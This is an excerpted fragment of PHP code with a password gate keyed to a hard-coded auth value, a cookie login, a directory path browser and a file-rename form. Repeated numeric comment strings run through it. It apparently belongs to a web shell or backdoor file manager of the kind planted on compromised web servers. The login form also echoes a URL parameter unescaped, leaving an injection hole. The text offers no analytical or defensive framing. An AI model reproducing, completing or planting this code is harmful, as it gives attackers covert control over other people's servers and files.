...
$auth_key = "747bb3a805eccb7bb7b032dd286f76df";
...
$pass = false;
if (isset($_COOKIE['pw_name_93772'])) {
    if(($_COOKIE['pw_name_93772']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_93772'])) {
        if(($_POST['pw_name_93772']) == $auth_key) {
            setcookie("pw_name_93772", $_POST['pw_name_93772']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_93772' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726275641325816 1726275641232848 1726275641791733 1726275641567918
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726275641325816 1726275641232848 1726275641791733 1726275641567918
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726275641325816 1726275641232848 1726275641791733 1726275641567918
            $name = PATH . "/" . $_GET['r'];
